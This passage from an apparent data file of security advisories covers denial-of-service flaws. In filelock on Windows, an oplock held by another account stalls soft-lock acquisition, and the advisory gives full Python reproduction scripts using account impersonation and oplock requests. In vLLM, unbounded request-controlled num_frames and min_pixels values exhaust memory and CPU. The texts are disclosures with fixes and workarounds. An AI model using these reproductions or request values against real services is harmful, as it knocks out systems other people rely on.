Potential for denial of service due to memory exhaustion from peers sending malicious Brotli-encoded certificates, for applications that enable Brotli decompression.

### Acknowledgement
Thanks to OpenAI [OutboundDisclosures@openai.com](mailto:OutboundDisclosures@openai.com) for the disclosure.

items.title: filelock: On Windows an oplock on a soft lock's marker holds SoftFileLock.acquire() past its timeout and blocks the stale break
items.description:
On Windows the soft locks (`SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, their async forms, and a `FileLock` that fell back to a soft lock) read their marker by path. The marker is the lock file whose presence says a process holds the lock. Each `acquire()` attempt that finds a marker opens it with `os.open` to read the holder's process id, and the lock renames and deletes a marker it judges stale, by path. On Windows each of these calls waits for an oplock. An oplock (opportunistic lock) is a request by a process that holds a handle on a file to be told before another process opens, renames or deletes that file; the other process waits until the holder answers the break or closes its handle.

Another local account that can open the marker for reading can take a Level 1 oplock on it while no process holds it open, and leave the break unanswered. Every `acquire()` by the user running the lock (below: the lock user) then waits inside the open, past its `timeout`, `blocking=False` and `cancel_check`, and a stale marker under that oplock is not broken. Mutual exclusion holds and the lock touches no other file. Affected versions are filelock 3.22.0 through 4.2.0 on Windows. The maintainers found this while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4); it is not among the scanner's findings.

## Severity

**CVSS 3.1 `CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:L` scores 2.5 (Low).**

`AV:L` (local): the other account needs a logon on the same host. `AC:H` (high attack complexity): Windows grants a Level 1 or batch oplock only to the sole open handle on a file, so the marker must have no holder handle when the other account asks. That account cannot bring this about; it waits for a holder that died, closed its descriptor, or left a marker past its `lifetime`. `PR:L` (low privileges): an ordinary account with read access to the marker through the directory's inherited ACL (access control list). `UI:N` (no user interaction). `S:U` (scope unchanged). `C:N` and `I:N`: that account can read the marker's content (process id and host name) anyway, and mutual exclusion holds. `A:L` (partial availability impact): one thread, or the event loop with `run_in_executor=False`, waits until the holder answers; 10 s per attempt in the two-account runs, no crash. Metrics in doubt take the lower reading.

Classification from the review: **security, conditional** on an unheld marker that another account can open.

## Scope and preconditions

- Platform and classes: Windows only. `SoftFileLock`, `MarkerSoftFileLock`, `SoftFileLease`, `AsyncSoftFileLock` and the other async soft locks, and `FileLock` after its `ENOSYS` fallback to a soft lock. `WindowsFileLock` opens its lock file on a separate code path that this advisory does not cover.
- Marker access: the soft locks create the marker with `os.open`, which on Windows applies no more of `mode` than the read-only attribute (GHSA-8mx5-7m5m-r77g). The marker carries the lock directory's inheritable entries. Another account that those entries grant read access to new files can open the marker with a read handle that shares read, write and delete.
- Unheld marker: no handle may be open on the marker when the other account requests the oplock. That is a holder that died and left its marker, a holder that closed its descriptor, or a marker whose `lifetime` has passed. While the holder keeps its handle, the request fails.
- Holder behavior: the other account requests the oplock through an overlapped `DeviceIoControl` and never acknowledges the break. Windows cancels a thread's pending request when the thread exits, so the holder thread stays alive. A same-account process that answers slowly, such as an indexer, has the same effect for its answer time.
- What the lock user sees: `SoftFileLock.acquire(timeout=1)` returned `Timeout` after 10.02 s with the second account's handle. In the same-account probe `os.open` with `O_RDONLY` was still running after 15 s and returned once the holder closed. The retry loop consults `timeout`, `blocking=False` and `cancel_check` between attempts only. With `AsyncSoftFileLock(run_in_executor=False)` the event loop waits.
- Stale break: `break_lock_file` renames and unlinks by path. Both calls wait in the same way, so a stale marker under such an oplock stays, and no process acquires the lock until the holder closes.
- Not affected: mutual exclusion, and the lock reads, writes and deletes no file other than the marker.

## Affected code

Scanned commit `b831496b0273`: the [`os.open` in `_read_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L323) ([function](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L312-L335)), called from [`_try_break_stale_lock`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L107-L123) on every attempt that finds a marker, and from [`_unprobeable_holder`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L137), [`pid`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L164) and [`is_lock_held_by_us`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_soft.py#L179). [`break_lock_file`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_util.py#L84-L122) renames at L116 and unlinks at L118 and L122, by path. [`_poll_until_acquired`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1378-L1408) and [`_check_give_up`](https://github.com/tox-dev/filelock/blob/b831496b0273ecd11bf02b8d080ca8b673a538c1/src/filelock/_api.py#L1590-L1608) test the deadline, `blocking` and `cancel_check` only between attempts.

## Introduced

[e35c3af](https://github.com/tox-dev/filelock/commit/e35c3af) "feat(soft): detect and break stale locks" ([#476](https://github.com/tox-dev/filelock/pull/476), 2026-02-13), first tag 3.22.0 (verified with `git tag --contains`). Before it a soft lock created its marker with `O_CREAT | O_EXCL` and never opened an existing one. #476 read the marker on Windows through `CreateFileW` and broke a stale one with `Path.rename` and `Path.unlink`. These wait for an oplock as `os.open` does, because none of them passes `FILE_COMPLETE_IF_OPLOCKED`, an `NtCreateFile` option that returns instead of waiting. The read became the `os.open` in `_read_lock_file` with [bfbfa76](https://github.com/tox-dev/filelock/commit/bfbfa76) ([#548](https://github.com/tox-dev/filelock/pull/548), 3.29.1) and the break moved into `break_lock_file` with [d244c6d](https://github.com/tox-dev/filelock/commit/d244c6d) ([#551](https://github.com/tox-dev/filelock/pull/551), 3.29.2); the by-path calls stayed.

## Mechanism

Each attempt of `_acquire` first calls `os.open(path, O_WRONLY | O_CREAT | O_EXCL)`. On an existing marker that fails with `EEXIST` (or `EACCES` on Windows) at once; the same-account probe shows the failed exclusive create returning at once under an oplock too. `_acquire` then calls `_try_break_stale_lock`, which calls `_read_lock_file`: `os.lstat`, then `os.open(path, O_RDONLY | O_NOFOLLOW | O_NONBLOCK)`. On Windows `O_NOFOLLOW` and `O_NONBLOCK` do not exist (the code reads them with `getattr(os, ..., 0)`), and `os.open` calls `CreateFileW`. When another handle holds a Level 1 or batch oplock on the file, that call sends the holder a break request and returns only when the holder acknowledges it or closes its handle. `_check_give_up` tests the deadline after the attempt returns, so the wait overruns `timeout`, `blocking=False` and `cancel_check` by its length. Once the open returns, the attempt ends and `_check_give_up` raises `Timeout`, because the deadline has passed.

A marker whose holder is gone takes the second path. `break_lock_file` renames it to a break name and unlinks it, by path. On Windows the rename and the delete open the file with delete access, which breaks a Level 1 or batch oplock the same way; the same-account probe shows `os.rename` and `os.unlink` still running after 15 s and returning once the holder closed. The `lifetime` break at L123 runs the same function. A stale marker under such an oplock is therefore not removed, and every attempt by every process waits inside the read. The other account can request the oplock again as soon as the lock user's handle closes, between two attempts or two `acquire()` calls, as in the Linux lease case of GHSA-7hmp-gf99-57hx. Nothing in the retry loop bounds this wait.

## Reproduction

The review's reproducers, quoted as received. `oplock_vm.py` section `[2]` is this finding; sections `[1a]` and `[1b]` belong to the `release()` advisory. `oplock_semantics_vm.py` is the same-account probe of which path operations wait. They ran on a Windows 11 VM (NTFS, CPython 3.14.8) against the head of PR #835 at `3e4c5ef`, where `_read_lock_file` and `break_lock_file` are the same code as at `b831496b0273` apart from import changes. The second account `fltester` is a member of `Users`; the directory grants it `(OI)(CI)(M)`.

**`oplock_vm.py`**

```python
"""
Windows oplock checks beyond the lock-file open PR #835 changes: release() and the soft locks' marker read.

Run on the VM (PowerShell, from the synced worktree, with the fltester account present):
  C:\\venvs\\rev4F\\Scripts\\python.exe oplock_vm.py fltester '<password>' C:\\tmp\\rev4F-oplock

[1] A second account keeps requesting a Level 1 oplock on the lock file through a read handle that shares delete.
    WindowsFileLock._release closes its handle and then unlinks by path; an oplock granted in between makes the
    DeleteFileW inside os.unlink wait for the holder's acknowledgement. [1a] races the close-to-unlink window as is;
    [1b] widens that window to 200 ms with a patched os.unlink so the grant lands inside it.
[2] A second account holds a Level 1 oplock on a soft-lock marker whose holder is alive. SoftFileLock.acquire reads the
    marker through os.open, which waits for the acknowledgement, past timeout=1.

A thread that exits has its pending oplock request cancelled, so every holder thread stays alive until the end.
"""

from __future__ import annotations

import ctypes
import os
import subprocess
import sys
import threading
import time
from ctypes import wintypes

from filelock import FileLock, SoftFileLock, Timeout

user, password, base = sys.argv[1], sys.argv[2], sys.argv[3]
icacls = os.path.join(os.environ["SYSTEMROOT"], "System32", "icacls.exe")
os.makedirs(base, exist_ok=True)
subprocess.run([icacls, base, "/grant", f"{user}:(OI)(CI)(M)"], check=True, capture_output=True)

advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
advapi32.LogonUserW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.POINTER(wintypes.HANDLE),
]
kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):
    _fields_ = (
        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),
]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]

GENERIC_READ = 0x80000000
SHARE_ALL = 0x7
OPEN_EXISTING = 3
FLAG_OVERLAPPED = 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
FSCTL_REQUEST_OPLOCK_LEVEL_1 = 0x00090000
ERROR_IO_PENDING = 997
hold = threading.Event()
real_unlink = os.unlink


def impersonate() -> None:
    token = wintypes.HANDLE()
    if not advapi32.LogonUserW(user, ".", password, 3, 0, ctypes.byref(token)):
        raise ctypes.WinError(ctypes.get_last_error())
    if not advapi32.ImpersonateLoggedOnUser(token):
        raise ctypes.WinError(ctypes.get_last_error())


def request_level1(path: str) -> tuple[int, Overlapped] | None:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    if handle == INVALID_HANDLE:
        return None
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    if (
        not kernel32.DeviceIoControl(handle, FSCTL_REQUEST_OPLOCK_LEVEL_1, None, 0, None, 0, None, ctypes.byref(overlapped))
        and ctypes.get_last_error() == ERROR_IO_PENDING
    ):
        return handle, overlapped
    kernel32.CloseHandle(handle)
    kernel32.CloseHandle(overlapped.hEvent)
    return None


def drop(granted: tuple[int, Overlapped]) -> None:
    handle, overlapped = granted
    kernel32.CloseHandle(handle)
    kernel32.WaitForSingleObject(overlapped.hEvent, 5000)
    kernel32.CloseHandle(overlapped.hEvent)


def release_under_oplock_requests(label: str, lock_path: str, cycles: int) -> bool:
    stop = threading.Event()
    granted_box: list[tuple[int, Overlapped]] = []

    def spinner() -> None:
        impersonate()
        while not stop.is_set():
            if (granted := request_level1(lock_path)) is not None:
                granted_box.append(granted)
                hold.wait()
                return

    releasing = threading.Event()
    release_durations: list[float] = []

    def owner() -> None:
        # thread_local locks release only on the acquiring thread, so acquire and release stay on this one
        for _ in range(cycles):
            lock = FileLock(lock_path, is_singleton=False)
            lock.acquire(timeout=5)
            started = time.monotonic()
            releasing.set()
            lock.release()
            releasing.clear()
            release_durations.append(time.monotonic() - started)
            if granted_box:
                return

    holder = threading.Thread(target=spinner, daemon=True)
    holder.start()
    owner_thread = threading.Thread(target=owner, daemon=True)
    owner_thread.start()
    owner_thread.join(60)
    stalled = owner_thread.is_alive() and releasing.is_set()
    stop.set()
    longest = max(release_durations, default=0.0) * 1000
    print(f"  {label}: oplock granted: {bool(granted_box)}; cycles run: {len(release_durations)}; longest release: {longest:.1f} ms")
    if stalled:
        print("  release() still running after 60 s while the oplock holder has not answered the break")
        if granted_box:
            drop(granted_box[0])
        owner_thread.join(10)
        print(f"  release() returned after the holder closed its handle: {not owner_thread.is_alive()}")
    return stalled


print("[1a] release() against a second account that keeps requesting a Level 1 oplock, natural window")
stalled_native = release_under_oplock_requests("natural", os.path.join(base, "native.lock"), 500)

print("[1b] the same, with the window between the handle close and the unlink widened to 200 ms")


def slow_unlink(path: str, *, dir_fd: int | None = None) -> None:
    time.sleep(0.2)
    real_unlink(path, dir_fd=dir_fd)


os.unlink = slow_unlink
stalled_scheduled = release_under_oplock_requests("scheduled", os.path.join(base, "native-scheduled.lock"), 20)
os.unlink = real_unlink

print("[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker")
marker = os.path.join(base, "soft.lock")
holder = SoftFileLock(marker, is_singleton=False)
holder.acquire()
holder_fd = holder._context.lock_file_fd  # noqa: SLF001
os.close(holder_fd)  # the marker stays with a live PID, as after a holder that lost only its handle
impersonate_done = threading.Event()
granted_soft: list[tuple[int, Overlapped]] = []


def take_soft_oplock() -> None:
    impersonate()
    if (granted := request_level1(marker)) is not None:
        granted_soft.append(granted)
    impersonate_done.set()
    hold.wait()


threading.Thread(target=take_soft_oplock, daemon=True).start()
impersonate_done.wait(5)
print(f"  oplock granted: {bool(granted_soft)}")
outcome = ["still running after 25 s"]


def contend() -> None:
    started = time.monotonic()
    try:
        SoftFileLock(marker, is_singleton=False).acquire(timeout=1)
        outcome[0] = f"acquired after {time.monotonic() - started:.2f} s"
    except Timeout:
        outcome[0] = f"Timeout after {time.monotonic() - started:.2f} s"
    except OSError as error:
        outcome[0] = f"{type(error).__name__} after {time.monotonic() - started:.2f} s: {error}"


contender = threading.Thread(target=contend, daemon=True)
contender.start()
contender.join(25)
print(f"  contender: {outcome[0]}")
soft_stalled = "still running" in outcome[0]
if granted_soft:
    drop(granted_soft[0])
    contender.join(10)
    print(f"  after the holder closed: {outcome[0]}")
hold.set()
print("STALLS" if stalled_native or stalled_scheduled or soft_stalled else "BOUNDED")
```

Recorded output of section `[2]`:

```
[2] SoftFileLock.acquire(timeout=1) against a second account's Level 1 oplock on a live marker
  oplock granted: True
  contender: Timeout after 10.02 s
  after the holder closed: Timeout after 10.02 s
```

**`oplock_semantics_vm.py`**

```python
"""
Which path operations wait for an unanswered oplock break on Windows 11 NTFS. Same account, one process.

Run on the VM: C:\\venvs\\rev4F\\Scripts\\python.exe oplock_semantics_vm.py C:\\tmp\\rev4F-sem
"""

from __future__ import annotations

import ctypes
import os
import sys
import threading
import time
from ctypes import wintypes

base = sys.argv[1]
os.makedirs(base, exist_ok=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
kernel32.CreateFileW.restype = kernel32.CreateEventW.restype = wintypes.HANDLE
kernel32.CreateFileW.argtypes = [
    wintypes.LPCWSTR,
    wintypes.DWORD,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    wintypes.DWORD,
    wintypes.HANDLE,
]


class Overlapped(ctypes.Structure):
    _fields_ = (
        ("Internal", ctypes.c_void_p),
        ("InternalHigh", ctypes.c_void_p),
        ("Offset", wintypes.DWORD),
        ("OffsetHigh", wintypes.DWORD),
        ("hEvent", wintypes.HANDLE),
    )


kernel32.DeviceIoControl.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    wintypes.DWORD,
    ctypes.c_void_p,
    ctypes.POINTER(Overlapped),
]
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]
kernel32.WaitForSingleObject.argtypes = [wintypes.HANDLE, wintypes.DWORD]
GENERIC_READ, GENERIC_WRITE = 0x80000000, 0x40000000
SHARE_ALL, OPEN_EXISTING, FLAG_OVERLAPPED = 0x7, 3, 0x40000000
INVALID_HANDLE = wintypes.HANDLE(-1).value
LEVELS = {"level1": 0x00090000, "batch": 0x00090008}


def take(path: str, level: str) -> tuple[int, Overlapped]:
    handle = kernel32.CreateFileW(path, GENERIC_READ, SHARE_ALL, None, OPEN_EXISTING, FLAG_OVERLAPPED, None)
    overlapped = Overlapped(hEvent=kernel32.CreateEventW(None, True, False, None))
    pending = not kernel32.DeviceIoControl(handle, LEVELS[level], None, 0, None, 0, None, ctypes.byref(overlapped))
    assert pending and ctypes.get_last_error() == 997, ctypes.get_last_error()
    return handle, overlapped


def drop(granted: tuple[int, Overlapped]) -> None:
    kernel32.CloseHandle(granted[0])
    kernel32.WaitForSingleObject(granted[1].hEvent, 5000)
    kernel32.CloseHandle(granted[1].hEvent)


def timed(label: str, operation) -> None:  # noqa: ANN001
    done = threading.Event()
    result = ["still running after 15 s"]

    def run() -> None:
        started = time.monotonic()
        try:
            operation()
            result[0] = f"returned after {(time.monotonic() - started) * 1000:.1f} ms"
        except OSError as error:
            result[0] = f"{type(error).__name__} after {(time.monotonic() - started) * 1000:.1f} ms: {error}"
        done.set()

    threading.Thread(target=run, daemon=True).start()
    done.wait(15)
    print(f"  {label}: {result[0]}")
    return done


def open_read(path: str) -> None:
    os.close(os.open(path, os.O_RDONLY | os.O_BINARY))


def open_write(path: str) -> None:
    os.close(os.open(path, os.O_RDWR | os.O_BINARY))


def create_new(path: str) -> None:
    os.close(os.open(path, os.O_WRONLY | os.O_CREAT | os.O_EXCL | os.O_BINARY))


for level in LEVELS:
    for label, operation, consumes in (
        ("os.open O_RDONLY", open_read, False),
        ("os.open O_RDWR", open_write, False),
        ("os.open O_CREAT|O_EXCL on the existing file", create_new, False),
        ("os.utime by path", lambda p: os.utime(p, None), False),
        ("os.rename", lambda p: os.rename(p, p + ".moved"), True),
        ("os.unlink", os.unlink, True),
    ):
        path = os.path.join(base, f"{level}-{label.replace(' ', '_').replace('|', '')}.lock")
        with open(path, "w", encoding="utf-8") as handle:
            handle.write("1\nhost\n")
        granted = take(path, level)
        print(f"{level}, {label}")
        done = timed(label, lambda p=path, op=operation: op(p))
        drop(granted)
        done.wait(5)
        print(f"    after the holder closed: {'done' if done.is_set() else 'still running'}")
```

The review kept this probe's result as a sentence rather than its printed lines: under a same-account Level 1 or batch oplock, `os.open(path, os.O_RDONLY)`, `os.rename` and `os.unlink` were still running after 15 s and returned only once the holder closed its handle; `os.utime` by path and a failed `O_CREAT | O_EXCL` create returned at once.

## Failure sequence

```mermaid
sequenceDiagram
    participant A as other local account
    participant M as soft.lock marker, no handle open
    participant L as lock user: SoftFileLock(path).acquire(timeout=1)
    participant W as Windows (NTFS)
    A->>W: CreateFileW(soft.lock, GENERIC_READ, share read/write/delete, FILE_FLAG_OVERLAPPED)
    A->>W: DeviceIoControl(FSCTL_REQUEST_OPLOCK_LEVEL_1), granted, break never acknowledged
    L->>W: os.open(soft.lock, O_CREAT|O_EXCL) fails with EEXIST at once
    L->>W: os.lstat(soft.lock) regular file
    rect rgb(255, 214, 214)
        L->>W: os.open(soft.lock, O_RDONLY) inside _read_lock_file
        Note over L,W: CreateFileW asks A to break the oplock and waits#59; the 1 s deadline, blocking=False and cancel_check are not consulted
        W-->>L: handle after 10.02 s (two-account run), or when A closes (same-account probe)
    end
    L->>L: _check_give_up: past the deadline, raise Timeout after 10.02 s
    Note over A,M: a stale marker takes the same wait in Path.rename and Path.unlink, so it is not broken
```

## Evidence

Section `[2]` of `oplock_vm.py` acquired `soft.lock` as the test account, closed the holder's descriptor so the marker stayed with a live process id and no open handle, took a Level 1 oplock through the second account's read handle (`oplock granted: True`), and ran `SoftFileLock(marker, is_singleton=False).acquire(timeout=1)` on a thread. The call returned `Timeout` after 10.02 s, before the holder closed. The review did not establish what ends the wait at 10 s in the two-account runs; section `[1a]` of the same script, with the second account's handle, shows the same 10 s. In the same-account probe (`oplock_semantics_vm.py`) the open returned only when the holder closed, still running at 15 s. The probe also shows that the failed exclusive create and `os.utime` by path return at once, so the wait is in the read and the break, not in the create attempt.

## Impact

Each `acquire()` of a soft lock that finds a marker another account holds an oplock on runs past its `timeout`, `blocking=False` and `cancel_check` until the holder answers or closes, 10 s per attempt in the recorded two-account runs. A stale marker under that oplock is not broken, so no process acquires the lock while the holder keeps its handle. With `AsyncSoftFileLock(run_in_executor=False)` the wait is on the event loop thread and stops every task in the process; with the default executor one worker thread waits. The documentation names a soft lock as the option for network filesystems, after verification on the mount, and `FileLock` is a soft lock on builds without `fcntl` and after its `ENOSYS` fallback. Mutual exclusion is not affected and nothing other than the marker is read, written or deleted.

## Workarounds

- Keep soft-lock markers in a directory whose ACL grants other accounts no access to new files: a directory inside the user profile, or one with inheritance removed and only the owner, `SYSTEM` and `Administrators` granted (`icacls <dir> /inheritance:r /grant:r "<owner>:(OI)(CI)F" "SYSTEM:(OI)(CI)F" "Administrators:(OI)(CI)F"`). `mode` does not do this on Windows.
- Run `AsyncSoftFileLock` with the default executor rather than `run_in_executor=False`, so that only a worker thread waits.
- No `timeout`, `blocking` or `cancel_check` value bounds the wait.

## Patched version

4.2.1.

Fix: https://github.com/tox-dev/filelock/pull/835

Found by the maintainers while reviewing the fix for the report Anthropic's OSS Scanner sent on 15 October 2026 (review round 4, finding F4).

items.title: vLLM OpenCVDynamicOpenPanguVideoBackend: request-level num_frames without a ceiling — unauthenticated memory/CPU exhaustion (OOM-kill) on any video-capable deployment
items.description:
## Summary

`OpenCVDynamicOpenPanguVideoBackend` (`vllm/multimodal/video.py:1222-1260`) drives its frame-index computation from the request-controlled `num_frames` with **no ceiling**. The backend is registered without a `video_processor` binding, so no model selects it by default — but `VideoMediaIO` honors request-level `media_io_kwargs.video.video_backend` for any registered **CPU** loader (`merge_kwargs`, `vllm/multimodal/media/video.py:42-90`, strips only `hw_decoders`/`pool_size`/`device`/unconfigured-GPU backends and clamps none of the sampling knobs). One unauthenticated `POST /v1/chat/completions` (or `/tokenize`) with `"video_backend": "openpangu"` routes any video through this sampler on **any video-capable deployment** — no GLM/OpenPangu model required, no non-default flags, no auth.

## Root cause

```python
num_frames = target.num_frames          # request-controlled, unclamped
fps = target.fps                        # request-controlled
if fps > 0:
    if num_frames >= int(total_duration * fps) + 1:
        num_frames = int(total_duration * fps) + 1   # clamp only fires when ABOVE duration*fps
...
sample_frame_timestamps = np.linspace(0, total_duration, num_frames, dtype=float)
frames_indices = [min(total_frames_num - 1, round(t * original_fps))
                  for t in sample_frame_timestamps]
```

The only clamp fires when `num_frames >= int(duration*fps)+1`. Choosing `num_frames` just below that bound — or `fps=-1`, which skips the branch entirely — leaves the request value untouched: `np.linspace(0, d, num_frames)` allocates `8 × num_frames` bytes and the Python comprehension walks every element, inside the API-server process.

Measured in-process (official CPU image, `vllm/vllm-openai-cpu:latest` v0.30.0):

- `num_frames=1e7` → 462 MB peak, 118 s CPU
- `num_frames=1e9` → ~46 GB / hours (linear extrapolation) → OOM-kill

This is an instance of the published unclamped-`num_frames` family (GHSA-vxqj-p4gw-9h4c; central clamp PR #51969 subsequently superseded by #58830), with two aggravating differences: the sink is a distinct `np.linspace` + list-comprehension allocation, and the backend is reachable via request-level backend selection **without any model opting into it**.

## Suggested fix

- Backend: clamp `num_frames` before `np.linspace` (e.g. `min(num_frames, total_frames_num)` or a class-level cap) and treat `fps=-1` the same.
- Central: land the `num_frames` clamp in `VideoMediaIO.merge_kwargs` (where PR #51969 is adding it) so per-backend audits stop missing siblings, and consider gating request-level `video_backend` selection to an allowlist.

## Static reach

`vllm/multimodal/media/video.py:42-90` (`merge_kwargs`: no clamp on `num_frames`/`fps`; GPU-only gating for `video_backend`); sink at `vllm/multimodal/video.py:1222-1260`.

## Affected versions

- Package: `vllm` (PyPI).
- Affected versions: `>= 0.30.0, < 0.31.0`.
- First stable patched version: `0.31.0`.

PR #58830 blocks untrusted per-request `mm_processor_kwargs` and `media_io_kwargs` by default before preprocessing. Keep `--trust-request-mm-kwargs` disabled for untrusted clients. Explicitly enabling it restores trusted override behavior; the underlying processor/sampler is not independently bounded by this fix.

The lower bound records the verified affected v0.30.0 release. The backend predates that release; earlier request-path exposure has not been comprehensively assessed.

Advisory fixed in [#58830](https://github.com/vllm-project/vllm/pull/58830).

items.title: MiniMax M3 video preprocessing permits request-driven CPU resource exhaustion through min_pixels
items.description:
Description

### Summary

A client allowed to call the OpenAI-compatible API can pass request-level `mm_processor_kwargs` to the MiniMax M3 VL video processor. The processor accepts `min_pixels` without a numeric range or relationship check. A large value can enlarge every decoded frame well beyond the default per-frame `max_pixels` value.

The processor has a fixed width × height × frame-count budget, but it applies that check only when `max_long_side_pixel` is set. Its default value is `None`, so the normal area-based resize path skips the video-wide budget and proceeds to resize, normalize, reshape, and concatenate the enlarged tensors before later engine validation.

This can cause disproportionate host-memory allocation and CPU work from one video request and may disrupt the worker or service. I confirmed the complete request-to-allocation path by static source review. I did not run vLLM, a model, a server, a GPU workload, or an executable proof of concept, so I am not claiming a measured out-of-memory threshold or a guaranteed process crash.

I assessed vLLM `v0.28.0`. The same vulnerable conditions are present in every inspected release from `v0.24.0` through `v0.29.0`; no patched release was available when I checked on 2026-09-09.

### Details

The public chat and responses request schemas expose `mm_processor_kwargs` as `dict[str, Any]`:

- [`vllm/entrypoints/openai/chat_completion/protocol.py`, lines 372-375](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/entrypoints/openai/chat_completion/protocol.py#L372-L375)
- [`vllm/entrypoints/openai/responses/protocol.py`, lines 238-241](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/entrypoints/openai/responses/protocol.py#L238-L241)

The renderer forwards this dictionary as the request's multimodal processor defaults, and inference-time values override the startup values:

- [`vllm/renderers/online_renderer.py`, lines 406-413](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/renderers/online_renderer.py#L406-L413)
- [`vllm/config/multimodal.py`, lines 503-515](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/config/multimodal.py#L503-L515)

The common processor wrapper filters keyword names but does not validate the numeric value or require `min_pixels <= max_pixels`. MiniMax's vLLM adapter then forces `do_resize=True` and passes the merged values to the processor:

- [`vllm/transformers_utils/processor.py`, lines 117-142](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/transformers_utils/processor.py#L117-L142)
- [`vllm/models/minimax_m3/common/mm_preprocess.py`, lines 306-352](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/models/minimax_m3/common/mm_preprocess.py#L306-L352)

`smart_resize` first checks whether the current frame is above `max_pixels`. If it is not, the `elif` branch may enlarge it to the request-controlled `min_pixels`. The function does not reject `min_pixels > max_pixels`:

```python
if h_bar * w_bar > max_pixels:
    beta = math.sqrt((height * width) / max_pixels)
    h_bar = floor_by_factor(height / beta, factor)
    w_bar = floor_by_factor(width / beta, factor)
elif h_bar * w_bar < min_pixels:
    beta = math.sqrt(min_pixels / (height * width))
    h_bar = ceil_by_factor(height * beta, factor)
    w_bar = ceil_by_factor(width * beta, factor)
```

Source: [`vllm/transformers_utils/processors/minimax_m3.py`, lines 108-148](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/transformers_utils/processors/minimax_m3.py#L108-L148)

The video processor sets `max_long_side_pixel = None` and `max_total_pixels = VIDEO_MAX_TOTAL_PIXELS`. During preprocessing it deliberately passes `max_total_pixels=None` to the per-frame resize helper, intending to enforce the volumetric limit after the frame count is known. That later check is incorrectly conditional on `max_long_side_pixel is not None`:

```python
resized_height, resized_width = smart_resize(
    height,
    width,
    factor=factor,
    min_pixels=min_pixels,
    max_pixels=max_pixels,
    max_long_side_pixel=max_long_side_pixel,
    min_short_side_pixel=self.min_short_side_pixel,
    max_total_pixels=None,
)
if (
    max_long_side_pixel is not None
    and resized_height * resized_width * num_frames
    > self.max_total_pixels
):
    raise ValueError(...)
```

Source: [`vllm/transformers_utils/processors/minimax_m3.py`, lines 342-424](https://github.com/vllm-project/vllm/blob/2cf0a6915ce544dc493a0990f2ea38d81601128a/vllm/transformers_utils/processors/minimax_m3.py#L342-L424)

With the default `None` value, the processor skips this check and materializes resized and normalized tensors before concatenating the processed videos at line 491. The v1 engine's prompt and encoder-cache checks run after multimodal preprocessing, so they cannot prevent this allocation.

The decode-time `VLLM_MAX_IMAGE_PIXELS` check also does not close the path: it constrains the dimensions of an input frame before decoding, while the vulnerable processor enlarges that frame afterward.

#### Public overlap checked

Public PR [#51449](https://github.com/vllm-project/vllm/pull/51449), `Bound request-controlled image and video geometry`, reports the same broad class for 16 other multimodal processors. It does not list MiniMax M3 or the `min_pixels`, `max_total_pixels`, and `max_long_side_pixel` fields, and its patch does not modify either MiniMax file cited above. Its shared changes cap request-level frame count and a generic sampling loop; they do not reject `min_pixels > max_pixels` or make the MiniMax volumetric check unconditional. PR #51449 was closed without merge on 2026-08-10.

